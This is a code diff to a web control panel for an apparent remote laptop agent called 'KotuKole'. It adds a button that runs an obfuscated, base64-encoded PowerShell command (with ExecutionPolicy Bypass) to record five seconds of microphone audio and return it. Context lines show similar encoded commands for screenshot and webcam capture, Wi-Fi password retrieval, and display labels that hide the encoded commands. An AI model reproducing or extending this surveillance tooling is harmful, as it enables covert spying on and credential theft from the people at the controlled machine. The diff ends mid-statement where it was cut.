@@ -875,6 +875,57 @@
             box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4);
         }
 
+        .term-audio-card {
+            background: rgba(24, 18, 28, 0.95);
+            border: 1px solid rgba(239, 68, 68, 0.35);
+            border-radius: 10px;
+            padding: 12px 14px;
+            margin: 8px 0;
+            max-width: 520px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4);
+        }
+
+        .term-audio-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 0.82rem;
+            font-weight: 700;
+            color: #f87171;
+        }
+
+        .term-audio-player-wrap {
+            margin-bottom: 10px;
+            background: #0d1117;
+            padding: 8px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .term-audio-player-wrap audio {
+            width: 100%;
+            height: 38px;
+            outline: none;
+        }
+
+        .term-audio-actions {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+
+        .badge-rec {
+            font-size: 0.65rem;
+            padding: 2px 6px;
+            border-radius: 4px;
+            background: rgba(239, 68, 68, 0.2);
+            color: #ef4444;
+            border: 1px solid rgba(239, 68, 68, 0.4);
+            font-weight: 700;
+            letter-spacing: 0.05em;
+        }
+
         .term-screenshot-header {
             display: flex;
             align-items: center;
@@ -1074,6 +1125,9 @@
                 <button class="btn-chip" onclick="captureWebcam()" title="Capture real-time photo from physical laptop webcam" style="border-color: rgba(168, 85, 247, 0.4); color: #c084fc;">
                     📷 Webcam
                 </button>
+                <button class="btn-chip" onclick="recordAudio(5)" title="Record 5s ambient audio from laptop microphone" style="border-color: rgba(239, 68, 68, 0.4); color: #f87171;">
+                    🎙️ Mic (5s)
+                </button>
 
                 <button class="btn-chip" onclick="runQuickAction('wifi_profiles')" title="17: View all saved Wi-Fi Profiles">
                     📶 Wi-Fi List
@@ -1148,6 +1202,7 @@
                     <span class="chip-label">Suggestions:</span>
                     <span class="chip-pill" onclick="captureScreenshot()" style="border-color: rgba(56,189,248,0.4); color: #38bdf8;">📸 screenshot</span>
                     <span class="chip-pill" onclick="captureWebcam()" style="border-color: rgba(168,85,247,0.4); color: #c084fc;">📷 webcam</span>
+                    <span class="chip-pill" onclick="recordAudio(5)" style="border-color: rgba(239,68,68,0.4); color: #f87171;">🎙️ mic</span>
                     <span class="chip-pill" onclick="insertCmd('dir')">dir</span>
                     <span class="chip-pill" onclick="insertCmd('ipconfig')">ipconfig</span>
                     <span class="chip-pill" onclick="insertCmd('tasklist')">tasklist</span>
@@ -1370,6 +1425,8 @@
                     cmd = 'powershell -NoProfile -ExecutionPolicy Bypass -enc WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAVwBpAHQAaABQAGEAcgB0AGkAYQBsAE4AYQBtAGUAKAAnAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwAnACkAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAVwBpAHQAaABQAGEAcgB0AGkAYQBsAE4AYQBtAGUAKAAnAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAnACkAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAJABiACAAPQAgAFsAVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAuAFMAYwByAGUAZQBuAF0AOgA6AFAAcgBpAG0AYQByAHkAUwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwAKACQAYgBtAHAAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEQAcgBhAHcAaQBuAGcALgBCAGkAdABtAGEAcAAgACQAYgAuAFcAaQBkAHQAaAAsACAAJABiAC4ASABlAGkAZwBoAHQACgAkAGcAIAA9ACAAWwBEAHIAYQB3AGkAbgBnAC4ARwByAGEAcABoAGkAYwBzAF0AOgA6AEYAcgBvAG0ASQBtAGEAZwBlACgAJABiAG0AcAApAAoAdAByAHkAIAB7AAoAIAAgACAAIAAkAGcALgBDAG8AcAB5AEYAcgBvAG0AUwBjAHIAZQBlAG4AKAAkAGIALgBMAG8AYwBhAHQAaQBvAG4ALAAgAFsARAByAGEAdwBpAG4AZwAuAFAAbwBpAG4AdABdADoAOgBFAG0AcAB0AHkALAAgACQAYgAuAFMAaQB6AGUAKQAKAH0AIABjAGEAdABjAGgAIAB7AH0ACgAkAGMAbwBkAGUAYwAgAD0AIABbAEQAcgBhAHcAaQBuAGcALgBJAG0AYQBnAGkAbgBnAC4ASQBtAGEAZwBlAEMAbwBkAGUAYwBJAG4AZgBvAF0AOgA6AEcAZQB0AEkAbQBhAGcAZQBFAG4AYwBvAGQAZQByAHMAKAApACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAgACQAXwAuAE0AaQBtAGUAVAB5AHAAZQAgAC0AZQBxACAAJwBpAG0AYQBnAGUALwBqAHAAZQBnACcAIAB9AAoAJABwAGEAcgBhAG0AcwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAARAByAGEAdwBpAG4AZwAuAEkAbQBhAGcAaQBuAGcALgBFAG4AYwBvAGQAZQByAFAAYQByAGEAbQBlAHQAZQByAHMAKAAxACkACgAkAHAAYQByAGEAbQBzAC4AUABhAHIAYQBtAFsAMABdACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABEAHIAYQB3AGkAbgBnAC4ASQBtAGEAZwBpAG4AZwAuAEUAbgBjAG8AZABlAHIAUABhAHIAYQBtAGUAdABlAHIAKABbAEQAcgBhAHcAaQBuAGcALgBJAG0AYQBnAGkAbgBnAC4ARQBuAGMAbwBkAGUAcgBdADoAOgBRAHUAYQBsAGkAdAB5ACwAIABbAGwAbwBuAGcAXQA2ADAAKQAKACQAbQBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQAKACQAYgBtAHAALgBTAGEAdgBlACgAJABtAHMALAAgACQAYwBvAGQAZQBjACwAIAAkAHAAYQByAGEAbQBzACkACgAkAGIANgA0ACAAPQAgAFsAQwBvAG4AdgBlAHIAdABdADoAOgBUAG8AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAG0AcwAuAFQAbwBBAHIAcgBhAHkAKAApACkACgAkAGcALgBEAGkAcwBwAG8AcwBlACgAKQAKACQAYgBtAHAALgBEAGkAcwBwAG8AcwBlACgAKQAKACQAbQBzAC4ARABpAHMAcABvAHMAZQAoACkACgBXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACgAJwA9AD0ASwBPAFQAVQBLAE8ATABFAF8AUwBDAFIARQBFAE4AUwBIAE8AVAA9AD0AZABhAHQAYQA6AGkAbQBhAGcAZQAvAGoAcABlAGcAOwBiAGEAcwBlADYANAAsACcAIAArACAAJABiADYANAAgACsAIAAnAD0APQBFAE4ARABfAFMAQwBSAEUARQBOAFMASABPAFQAPQA9ACcAKQA=';
                 } else if (action === 'webcam') {
                     cmd = 'powershell -NoProfile -ExecutionPolicy Bypass -sta -enc JAB0AGUAbQBwAEYAaQBsAGUAIAA9ACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAGsAbwB0AHUAawBvAGwAZQBfAHcAZQBiAGMAYQBtAC4AagBwAGcAIgAKACQAYwBvAGQAZQAgAD0AIABAACIACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7AAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBEAHIAYQB3AGkAbgBnAC4ASQBtAGEAZwBpAG4AZwA7AAoACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFcAZQBiAEMAYQBtAEMAYQBwAHQAdQByAGUAIAB7AAoAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBhAHYAaQBjAGEAcAAzADIALgBkAGwAbAAiACwAIABFAG4AdAByAHkAUABvAGkAbgB0ACAAPQAgACIAYwBhAHAAQwByAGUAYQB0AGUAQwBhAHAAdAB1AHIAZQBXAGkAbgBkAG8AdwBBACIAKQBdAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAGMAYQBwAEMAcgBlAGEAdABlAEMAYQBwAHQAdQByAGUAVwBpAG4AZABvAHcAQQAoAHMAdAByAGkAbgBnACAAbABwAHMAegBXAGkAbgBkAG8AdwBOAGEAbQBlACwAIABpAG4AdAAgAGQAdwBTAHQAeQBsAGUALAAgAGkAbgB0ACAAeAAsACAAaQBuAHQAIAB5ACwAIABpAG4AdAAgAG4AVwBpAGQAdABoACwAIABpAG4AdAAgAG4ASABlAGkAZwBoAHQALAAgAEkAbgB0AFAAdAByACAAaABXAG4AZAAsACAAaQBuAHQAIABuAEkARAApADsACgAgACAAIAAgAAoAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgB1AHMAZQByADMAMgAuAGQAbABsACIAKQBdAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAUwBlAG4AZABNAGUAcwBzAGEAZwBlACgASQBuAHQAUAB0AHIAIABoAFcAbgBkACwAIABpAG4AdAAgAE0AcwBnACwAIABpAG4AdAAgAHcAUABhAHIAYQBtACwAIABpAG4AdAAgAGwAUABhAHIAYQBtACkAOwAKACAAIAAgACAACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAHUAcwBlAHIAMwAyAC4AZABsAGwAIgApAF0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABEAGUAcwB0AHIAbwB5AFcAaQBuAGQAbwB3ACgASQBuAHQAUAB0AHIAIABoAFcAbgBkACkAOwAKAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAYgBvAG8AbAAgAEMAYQBwAHQAdQByAGUAKABzAHQAcgBpAG4AZwAgAGYAaQBsAGUAUABhAHQAaAApACAAewAKACAAIAAgACAAIAAgACAAIABJAG4AdABQAHQAcgAgAGgAVwBuAGQAIAA9ACAAYwBhAHAAQwByAGUAYQB0AGUAQwBhAHAAdAB1AHIAZQBXAGkAbgBkAG8AdwBBACgAIgBXAGUAYgBjAGEAbQAiACwAIAAwACwAIAAwACwAIAAwACwAIAA2ADQAMAAsACAANAA4ADAALAAgAEkAbgB0AFAAdAByAC4AWgBlAHIAbwAsACAAMAApADsACgAgACAAIAAgACAAIAAgACAAaQBmACAAKABoAFcAbgBkACAAPQA9ACAASQBuAHQAUAB0AHIALgBaAGUAcgBvACkAIAByAGUAdAB1AHIAbgAgAGYAYQBsAHMAZQA7AAoACgAgACAAIAAgACAAIAAgACAAUwBlAG4AZABNAGUAcwBzAGEAZwBlACgAaABXAG4AZAAsACAAMAB4ADAANAAwADAAIAArACAAMQAwACwAIAAwACwAIAAwACkAOwAKACAAIAAgACAAIAAgACAAIABTAGUAbgBkAE0AZQBzAHMAYQBnAGUAKABoAFcAbgBkACwAIAAwAHgAMAA0ADAAMAAgACsAIAA1ADAALAAgADEALAAgADAAKQA7AAoAIAAgACAAIAAgACAAIAAgAFMAZQBuAGQATQBlAHMAcwBhAGcAZQAoAGgAVwBuAGQALAAgADAAeAAwADQAMAAwACAAKwAgADUAMgAsACAAMwAwACwAIAAwACkAOwAKACAAIAAgACAAIAAgACAAIABTAHkAcwB0AGUAbQAuAFQAaAByAGUAYQBkAGkAbgBnAC4AVABoAHIAZQBhAGQALgBTAGwAZQBlAHAAKAA4ADAAMAApADsACgAKACAAIAAgACAAIAAgACAAIABTAGUAbgBkAE0AZQBzAHMAYQBnAGUAKABoAFcAbgBkACwAIAAwAHgAMAA0ADAAMAAgACsAIAA2ADAALAAgADAALAAgADAAKQA7AAoAIAAgACAAIAAgACAAIAAgAFMAeQBzAHQAZQBtAC4AVABoAHIAZQBhAGQAaQBuAGcALgBUAGgAcgBlAGEAZAAuAFMAbABlAGUAcAAoADMAMAAwACkAOwAKACAAIAAgACAAIAAgACAAIABTAGUAbgBkAE0AZQBzAHMAYQBnAGUAKABoAFcAbgBkACwAIAAwAHgAMAA0ADAAMAAgACsAIAA0ADEALAAgADAALAAgADAAKQA7AAoAIAAgACAAIAAgACAAIAAgAAoAIAAgACAAIAAgACAAIAAgAHQAcgB5ACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEkAbQBhAGcAZQAgAGkAbQBnACAAPQAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAuAEMAbABpAHAAYgBvAGEAcgBkAC4ARwBlAHQASQBtAGEAZwBlACgAKQA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKABpAG0AZwAgACEAPQAgAG4AdQBsAGwAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAbQBnAC4AUwBhAHYAZQAoAGYAaQBsAGUAUABhAHQAaAAsACAASQBtAGEAZwBlAEYAbwByAG0AYQB0AC4ASgBwAGUAZwApADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgAH0AIABjAGEAdABjAGgAIAB7ACAAcgBlAHQAdQByAG4AIABmAGEAbABzAGUAOwAgAH0ACgAKACAAIAAgACAAIAAgACAAIABTAGUAbgBkAE0AZQBzAHMAYQBnAGUAKABoAFcAbgBkACwAIAAwAHgAMAA0ADAAMAAgACsAIAAxADEALAAgADAALAAgADAAKQA7AAoAIAAgACAAIAAgACAAIAAgAEQAZQBzAHQAcgBvAHkAVwBpAG4AZABvAHcAKABoAFcAbgBkACkAOwAKACAAIAAgACAAIAAgACAAIAByAGUAdAB1AHIAbgAgAHQAcgB1AGUAOwAKACAAIAAgACAAfQAKAH0ACgAiAEAACgBBAGQAZAAtAFQAeQBwAGUAIAAtAEEAcwBzAGUAbQBiAGwAeQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAGMAbwBkAGUAIAAtAFIAZQBmAGUAcgBlAG4AYwBlAGQAQQBzAHMAZQBtAGIAbABpAGUAcwAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwAsACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAAoAJAByAGUAcwAgAD0AIABbAFcAZQBiAEMAYQBtAEMAYQBwAHQAdQByAGUAXQA6ADoAQwBhAHAAdAB1AHIAZQAoACQAdABlAG0AcABGAGkAbABlACkACgBpAGYAIAAoACQAcgBlAHMAIAAtAGEAbgBkACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAdABlAG0AcABGAGkAbABlACkAKQAgAHsACgAgACAAIAAgACQAYgB5AHQAZQBzACAAPQAgAFsASQBPAC4ARgBpAGwAZQBdADoAOgBSAGUAYQBkAEEAbABsAEIAeQB0AGUAcwAoACQAdABlAG0AcABGAGkAbABlACkACgAgACAAIAAgACQAYgA2ADQAIAA9ACAAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACkACgAgACAAIAAgAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACQAdABlAG0AcABGAGkAbABlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAIgA9AD0ASwBPAFQAVQBLAE8ATABFAF8AVwBFAEIAQwBBAE0APQA9AGQAYQB0AGEAOgBpAG0AYQBnAGUALwBqAHAAZQBnADsAYgBhAHMAZQA2ADQALAAkAGIANgA0AD0APQBFAE4ARABfAFcARQBCAEMAQQBNAD0APQAiAAoAfQAgAGUAbABzAGUAIAB7AAoAIAAgACAAIABXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACIAWwBOAG8AdABpAGMAZQA6ACAARgBhAGkAbABlAGQAIAB0AG8AIABjAGEAcAB0AHUAcgBlACAAdwBlAGIAYwBhAG0AIABpAG0AYQBnAGUALgAgAFAAbABlAGEAcwBlACAAdgBlAHIAaQBmAHkAIAB3AGUAYgBjAGEAbQAgAGMAbwBuAG4AZQBjAHQAaQBvAG4AIABhAG4AZAAgAGMAYQBtAGUAcgBhACAAcAByAGkAdgBhAGMAeQAgAHMAZQB0AHQAaQBuAGcAcwAuAF0AIgAKAH0A';
+                } else if (action === 'mic') {
+                    cmd = 'powershell -NoProfile -ExecutionPolicy Bypass -enc JABzAGUAYwAgAD0AIAA1AAoAJAB3AGEAdgBQAGEAdABoACAAPQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABrAG8AdAB1AGsAbwBsAGUAXwBtAGkAYwAuAHcAYQB2ACIACgAkAGMAbwBkAGUAIAA9ACAAQAAiAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAA7AAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AVABoAHIAZQBhAGQAaQBuAGcAOwAKAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABBAHUAZABpAG8AUgBlAGMAbwByAGQAZQByACAAewAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAdwBpAG4AbQBtAC4AZABsAGwAIgAsACAARQBuAHQAcgB5AFAAbwBpAG4AdAAgAD0AIAAiAG0AYwBpAFMAZQBuAGQAUwB0AHIAaQBuAGcAQQAiACwAIABDAGgAYQByAFMAZQB0ACAAPQAgAEMAaABhAHIAUwBlAHQALgBBAG4AcwBpACwAIABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgAgAD0AIAB0AHIAdQBlACkAXQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAaQBuAHQAIABtAGMAaQBTAGUAbgBkAFMAdAByAGkAbgBnACgAcwB0AHIAaQBuAGcAIABsAHAAcwB0AHIAQwBvAG0AbQBhAG4AZAAsACAAUwB0AHIAaQBuAGcAQgB1AGkAbABkAGUAcgAgAGwAcABzAHQAcgBSAGUAdAB1AHIAbgBTAHQAcgBpAG4AZwAsACAAaQBuAHQAIAB1AFIAZQB0AHUAcgBuAEwAZQBuAGcAdABoACwAIABpAG4AdAAgAGgAdwBuAGQAQwBhAGwAbABiAGEAYwBrACkAOwAKAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAYgBvAG8AbAAgAFIAZQBjAG8AcgBkACgAcwB0AHIAaQBuAGcAIABmAGkAbABlAFAAYQB0AGgALAAgAGkAbgB0ACAAZAB1AHIAYQB0AGkAbwBuAFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAdAByAHkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbQBjAGkAUwBlAG4AZABTAHQAcgBpAG4AZwAoACIAYwBsAG8AcwBlACAAcgBlAGMAcwBvAHUAbgBkACIALAAgAG4AdQBsAGwALAAgADAALAAgADAAKQA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbQBjAGkAUwBlAG4AZABTAHQAcgBpAG4AZwAoACIAbwBwAGUAbgAgAG4AZQB3ACAAdAB5AHAAZQAgAHcAYQB2AGUAYQB1AGQAaQBvACAAYQBsAGkAYQBzACAAcgBlAGMAcwBvAHUAbgBkACIALAAgAG4AdQBsAGwALAAgADAALAAgADAAKQA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbQBjAGkAUwBlAG4AZABTAHQAcgBpAG4AZwAoACIAcwBlAHQAIAByAGUAYwBzAG8AdQBuAGQAIAB0AGkAbQBlACAAZgBvAHIAbQBhAHQAIABtAHMAIgAsACAAbgB1AGwAbAAsACAAMAAsACAAMAApADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABtAGMAaQBTAGUAbgBkAFMAdAByAGkAbgBnACgAIgBzAGUAdAAgAHIAZQBjAHMAbwB1AG4AZAAgAGIAaQB0AHMAcABlAHIAcwBhAG0AcABsAGUAIAAxADYAIABjAGgAYQBuAG4AZQBsAHMAIAAxACAAcwBhAG0AcABsAGUAcwBwAGUAcgBzAGUAYwAgADEANgAwADAAMAAiACwAIABuAHUAbABsACwAIAAwACwAIAAwACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAG0AYwBpAFMAZQBuAGQAUwB0AHIAaQBuAGcAKAAiAHIAZQBjAG8AcgBkACAAcgBlAGMAcwBvAHUAbgBkACIALAAgAG4AdQBsAGwALAAgADAALAAgADAAKQA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVABoAHIAZQBhAGQALgBTAGwAZQBlAHAAKABkAHUAcgBhAHQAaQBvAG4AUwBlAGMAbwBuAGQAcwAgACoAIAAxADAAMAAwACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAG0AYwBpAFMAZQBuAGQAUwB0AHIAaQBuAGcAKAAiAHMAYQB2AGUAIAByAGUAYwBzAG8AdQBuAGQAIAAiACIAIAArACAAZgBpAGwAZQBQAGEAdABoACAAKwAgACIAIgAiACwAIABuAHUAbABsACwAIAAwACwAIAAwACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAG0AYwBpAFMAZQBuAGQAUwB0AHIAaQBuAGcAKAAiAGMAbABvAHMAZQAgAHIAZQBjAHMAbwB1AG4AZAAiACwAIABuAHUAbABsACwAIAAwACwAIAAwACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAC4ARQB4AGkAcwB0AHMAKABmAGkAbABlAFAAYQB0AGgAKQA7AAoAIAAgACAAIAAgACAAIAAgAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIABmAGEAbABzAGUAOwAKACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAB9AAoAfQAKACIAQAAKAEEAZABkAC0AVAB5AHAAZQAgAC0AVAB5AHAAZQBEAGUAZgBpAG4AaQB0AGkAbwBuACAAJABjAG8AZABlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAAoAJAByAGUAcwAgAD0AIABbAEEAdQBkAGkAbwBSAGUAYwBvAHIAZABlAHIAXQA6ADoAUgBlAGMAbwByAGQAKAAkAHcAYQB2AFAAYQB0AGgALAAgACQAcwBlAGMAKQAKAGkAZgAgACgAJAByAGUAcwAgAC0AYQBuAGQAIAAoAFQAZQBzAHQALQBQAGEAdABoACAAJAB3AGEAdgBQAGEAdABoACkAKQAgAHsACgAgACAAIAAgACQAYgB5AHQAZQBzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJAB3AGEAdgBQAGEAdABoACkACgAgACAAIAAgACQAYgA2ADQAIAA9ACAAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACkACgAgACAAIAAgAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACQAdwBhAHYAUABhAHQAaAAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAAoAIAAgACAAIABXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACIAPQA9AEsATwBUAFUASwBPAEwARQBfAEEAVQBEAEkATwA9AD0AZABhAHQAYQA6AGEAdQBkAGkAbwAvAHcAYQB2ADsAYgBhAHMAZQA2ADQALAAkAGIANgA0AD0APQBFAE4ARABfAEEAVQBEAEkATwA9AD0AIgAKAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAVwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAFsATgBvAHQAaQBjAGUAOgAgAEYAYQBpAGwAZQBkACAAdABvACAAcgBlAGMAbwByAGQAIABhAHUAZABpAG8ALgAgAFAAbABlAGEAcwBlACAAdgBlAHIAaQBmAHkAIABtAGkAYwByAG8AcABoAG8AbgBlACAAYwBvAG4AbgBlAGMAdABpAG8AbgAgAGEAbgBkACAAcABlAHIAbQBpAHMAcwBpAG8AbgBzAC4AXQAiAAoAfQA=';
                 } else if (action === 'disks') {
                     cmd = 'powershell -NoProfile -Command "Get-PSDrive -PSProvider FileSystem | Select-Object Name, @{N=\'Used(GB)\';E={[math]::Round($_.Used/1GB,1)}}, @{N=\'Free(GB)\';E={[math]::Round($_.Free/1GB,1)}}, @{N=\'Total(GB)\';E={[math]::Round(($_.Used+$_.Free)/1GB,1)}}, Root | Format-Table -AutoSize"';
                 } else if (action === 'wifi_profiles') {
@@ -1403,6 +1460,7 @@
                 else if (action === 'ram') cmd = 'free -h';
                 else if (action === 'screenshot') cmd = 'echo "[Notice: Screen capture requires physical Windows laptop running KotuKole Agent.]"';
                 else if (action === 'webcam') cmd = 'echo "[Notice: Webcam capture requires physical Windows laptop running KotuKole Agent.]"';
+                else if (action === 'mic') cmd = 'echo "[Notice: Microphone audio recording requires physical Windows laptop running KotuKole Agent.]"';
                 else if (action === 'disks') cmd = 'df -h';
                 else if (action === 'wifi_profiles') cmd = 'nmcli connection show || ip a';
                 else if (action === 'wifi_pass') cmd = 'echo "Wi-Fi passwords only available on physical laptop."';
@@ -1549,6 +1607,40 @@
             outputEl.appendChild(card);
         }
 
+        // Audio Recording Helpers
+        function recordAudio(seconds = 5) {
+            runQuickAction('mic');
+        }
+
+        function renderAudioCard(audioUrl) {
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            const card = document.createElement('div');
+            card.className = 'term-audio-card';
+            card.innerHTML = `
+                <div class="term-audio-header">
+                    <span style="display:flex; align-items:center; gap:8px;">
+                        <span style="font-size:16px;">🎙️</span>
+                        <span>Laptop Microphone Clip</span>
+                        <span class="badge-rec">5 SECONDS</span>
+                    </span>
+                    <span class="term-screenshot-time">${timeStr}</span>
+                </div>
+                <div class="term-audio-player-wrap">
+                    <audio controls src="${audioUrl}"></audio>
+                </div>
+                <div class="term-audio-actions">
+                    <a href="${audioUrl}" download="kotukole-mic-${Date.now()}.wav" class="btn-chip" style="text-decoration:none; border-color:rgba(239,68,68,0.4); color:#f87171;">
+                        ⬇️ Download (.WAV)
+                    </a>
+                    <button class="btn-chip" onclick="recordAudio(5)" style="border-color:rgba(56,189,248,0.4); color:#38bdf8;">
+                        🔄 Record Again
+                    </button>
+                </div>
+            `;
+            outputEl.appendChild(card);
+        }
+
         document.addEventListener('keydown', (e) => {
             if (e.key === 'Escape') {
                 closeScreenshotModal();
@@ -1610,6 +1702,25 @@
                     }
                     renderWebcamCard(imgUrl);
                     openWebcamModal(imgUrl);
+                    outputEl.scrollTop = outputEl.scrollHeight;
+                    return;
+                }
+            }
+
+            if (typeof text === 'string' && text.includes('==KOTUKOLE_AUDIO==')) {
+                const match = text.match(/==KOTUKOLE_AUDIO==([\s\S]*?)==END_AUDIO==/);
+                if (match) {
+                    const audioUrl = match[1].trim();
+                    const cleanText = text.replace(/==KOTUKOLE_AUDIO==[\s\S]*?==END_AUDIO==/, '')
+                                          .replace(/#<\s*CLIXML[\s\S]*?<\/Objs>/i, '')
+                                          .trim();
+                    if (cleanText) {
+                        const extra = document.createElement('div');
+                        extra.className = 'term-out-text';
+                        extra.innerText = cleanText;
+                        outputEl.appendChild(extra);
+                    }
+                    renderAudioCard(audioUrl);
                     outputEl.scrollTop = outputEl.scrollHeight;
                     return;
                 }
@@ -1696,6 +1807,12 @@
                 return;
             }
 
+            if (cmd.toLowerCase() === 'mic' || cmd.toLowerCase() === 'audio' || cmd.toLowerCase() === 'record') {
+                recordAudio(5);
+                cmdInput.value = '';
+                return;
+            }
+
             // UI state: Running
             isRunningCommand = true;
             submitBtn.disabled = true;
@@ -1703,7 +1820,8 @@
             submitSpinner.style.display = 'inline-block';
 
             const displayCmd = cmd.includes('WwBSAGUAZgBsAGUAYwB0AGkAbwBu') ? 'screenshot (Capturing laptop screen...)' :
-                               cmd.includes('JAB0AGUAbQBwAEYAaQBsAGUAIAA9') ? 'webcam (Capturing laptop webcam photo...)' : cmd;
+                               cmd.includes('JAB0AGUAbQBwAEYAaQBsAGUAIAA9') ? 'webcam (Capturing laptop webcam photo...)' :
